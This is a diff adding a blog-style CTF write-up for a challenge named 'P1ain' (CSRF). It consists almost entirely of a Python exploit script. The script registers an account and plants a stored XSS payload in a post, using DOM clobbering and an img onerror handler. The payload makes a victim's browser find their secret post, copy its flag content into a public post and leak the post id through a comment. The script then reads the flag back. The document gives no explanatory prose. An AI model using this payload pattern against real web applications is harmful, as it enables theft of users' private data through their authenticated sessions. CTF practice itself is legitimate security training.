@@ -1,0 +1,97 @@
+# One's blog
+
+# P1ain
+
+# Concept
+
+- CSRF
+- Scenario
+
+# Writeup
+
+#### exploit.py
+
+```python
+import requests
+import os
+import time
+
+from urllib.parse import unquote
+
+url = "http://server"
+
+username = "testtesttest" + os.urandom(5).hex()
+password = username
+
+requests.post(url + "/auth/register", data={
+    "username": username,
+    "password": password
+}, headers={
+    "Content-Type": "application/x-www-form-urlencoded"
+})
+
+login_res = requests.post(url + "/auth/login", data={
+    "username": username,
+    "password": password
+}, headers={
+    "Content-Type": "application/x-www-form-urlencoded"
+}, allow_redirects=False)
+
+session = login_res.headers.get("Set-Cookie")
+
+post_res = requests.post(url + "/posts", data={
+    "title": "exploit",
+    "content": "fake"
+}, headers={
+    "Cookie": session,
+    "Content-Type": "application/x-www-form-urlencoded"
+})
+
+post_id = post_res.url.split("posts/")[1]
+
+requests.post(url + f"/posts/{post_id}/edit", data={
+    "title": "exploit",
+    "content": "fake",
+    "isPublic": "on"
+}, headers={
+    "Cookie": session,
+    "Content-Type": "application/x-www-form-urlencoded"
+})
+
+requests.get(url + f"/posts/{post_id}", headers={
+    "Cookie": session
+})
+
+time.sleep(0.2)
+
+requests.get(url + f"/posts/{post_id}", headers={
+    "Cookie": session
+})
+
+print(post_id)
+
+requests.post(url + f"/posts/{post_id}/edit", data={
+    "title": "exploit",
+    "content": """<form name="bar" id="lmao "><input form="lmao" name="removeAttribute"></form><img src="X" onerror="fetch('/posts/', { method: 'GET', credentials: 'include' }).then(res => res.text()).then(text => { const parser = new DOMParser(); const doc = parser.parseFromString(text, 'text/html'); const postId = [...doc.querySelectorAll('a.list-group-item')].find(a => a.querySelector('h5')?.textContent.trim() === 'th1s1smy2ecreTS0C0ntentD4ta')?.getAttribute('href')?.split('/')?.pop(); return postId; }).then((post_id) => { fetch(`/posts/${post_id}/edit`, { method: 'GET', credentials: 'include' }).then((res) => res.text()).then((text) => { const parser = new DOMParser(); const doc = parser.parseFromString(text, 'text/html'); const flag = doc.querySelector('#content')?.value; return flag; }).then((flag) => { fetch(`/posts/${post_id}/edit`, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `title=th1s1smy2ecreTS0C0ntentD4ta&content=${flag}&isPublic=on`, credentials: 'include' }).then(() => { fetch('/posts/""" + post_id + """/comments', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `content=uuid-${post_id}`, credentials: 'include' });});});});" />""",
+    "isPublic": "on"
+}, headers={
+    "Cookie": session,
+    "Content-Type": "application/x-www-form-urlencoded"
+})
+
+time.sleep(5)
+
+exploit_res = requests.get(url + f"/posts/{post_id}", headers={
+    "Cookie": session
+})
+
+flag_post_id = exploit_res.text.split("uuid-")[2].split("</p>")[0]
+
+flag_res = requests.get(url + f"/posts/{flag_post_id}", headers={
+    "Cookie": session
+})
+
+flag = unquote(flag_res.text.split('<div class="post-content">')[1].split("</div>")[0].strip())
+
+print("[+] FLAG : ", flag)
+```
